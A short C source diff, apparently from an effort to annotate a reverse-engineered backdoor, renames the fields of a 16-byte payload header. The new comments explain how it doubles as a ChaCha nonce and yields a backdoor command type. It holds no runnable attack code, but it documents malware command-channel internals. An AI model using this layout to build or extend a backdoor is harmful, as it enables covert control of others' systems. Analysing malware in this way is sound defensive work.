@@ -1345,15 +1345,15 @@ typedef struct __attribute__((packed)) secret_data_item {
 } secret_data_item_t;
 
 /*
- * Header laid over the RSA modulus bytes; fields A/B/C encode the command family and payload lengths before we decrypt the body.
+ * First 16 bytes of every encrypted payload chunk. The stride/index/bias triple stays in plaintext so decrypt_payload_message can reuse it as the ChaCha nonce, and run_backdoor_commands collapses it into monitor_data.cmd_type via (stride * index + bias) before committing to the payload.
  */
 typedef struct __attribute__((packed)) key_payload_hdr {
  union {
   u8 bytes[16];
   struct __attribute__((packed)) {
-   u32 field_a;
-   u32 field_b;
-   u64 field_c;
+   u32 cmd_type_stride; /* Low 32 bits of the ChaCha nonce; multiplied with cmd_type_index before cmd_type_bias is applied. */
+   u32 cmd_type_index; /* High 32 bits of the ChaCha nonce; second multiplicand in the cmd_type calculation. */
+   int64_t cmd_type_bias; /* Signed bias added to the product; also forms the top half of the 16-byte nonce. */
   };
  };
 } backdoor_payload_hdr_t;
